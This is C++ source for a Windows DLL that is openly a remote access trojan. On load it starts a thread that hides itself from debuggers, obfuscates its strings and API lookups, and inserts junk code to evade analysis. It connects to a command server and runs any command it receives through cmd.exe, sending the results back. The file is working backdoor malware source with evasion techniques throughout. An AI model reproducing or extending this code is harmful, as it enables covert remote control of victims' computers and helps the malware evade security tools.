#include <iostream>
#include <string>
#include "TCPClient.h"
#include "utils.h"
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"
#include "junk_codes.h"
#include "string_encryption.h"

#define HideThreadFromDebugger 0x11

typedef NTSTATUS(NTAPI* NtSetInformationThread_t)(
	HANDLE					 ThreadHandle,
	DWORD					 ThreadInformationClass,
	PVOID					 ThreadInformation,
	ULONG					 ThreadInformationLength
	);


DWORD WINAPI StartRAT(LPVOID lpParam)
{
	// consider using a single key, using multiple keys adds additional overhead (and huge performance downside), which is not a priority right now..	
	// here's one idea: generate one global key (in string_encryption.h), and use it. 
	// where you think it is better having a unique key, generate a new one in the specific context
	// with the global key: use a macro that returns the string after reencrypted and decrypted with the global key. after, we can always call the funcs manually if needed to reencrypt for example (or just reencrypt again with a new key, idk, doesn't matter.)
	// with the unique key: use an inline function (or macro possibly?) that gets the key generated, the string literal, reencrypts the string and returns the decrypted string
	// basically when using the macro or the inline function - we always reencrypt. then we perform the steps (e.g reencrypting afterwards or wiping the strings value) as we wish.


	// ok listen so its like this:
	// define all strings with compile_time_encrypt()
	// create wrappers that where needed, you just call it like this:  TCPClient* conn = new TCPClient(arrayToString(str_ip_encrypt), 54000);
	// or in the resolve_dynamically: resolve_dynamically<GetCurrentThread_t>(arrayToCStr(str_GetCurrentThread_encrypt));
	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>(string_encrypt("GetCurrentThread").c_str());
	resolve_dynamically<NtSetInformationThread_t>(string_encrypt("NtSetInformationThread").c_str(), NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);

	suspicious_junk_3();

	TCPClient* conn = new TCPClient(string_encrypt("127.0.0.1"), 54000);

	conn->start_connection();

	while (true)
	{
		
		// recv command from server
		std::string commandLine = string_encrypt("cmd.exe /C ");

		suspicious_junk_1();

		commandLine.append(conn->recv_data());

		std::string result = exec(commandLine);

		junk();

		// send result back to server
		conn->send_data(result);
	}
	delete conn;

	return 0;
}


BOOL WINAPI DllMain(HINSTANCE dllHandle, DWORD reason_for_call, LPVOID lpvReserved)
{
	switch (reason_for_call) {
	case DLL_PROCESS_ATTACH:
		// TODO: RESOLVE FUNCTION ADDRESSES DYNAMICALLY
		DisableThreadLibraryCalls(dllHandle);  // Avoid repeated DllMain calls for threads 
		CreateThread(nullptr, 0, StartRAT, nullptr, 0, nullptr); // Create a separate thread to run after DllMain, to avoid deadlocks
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
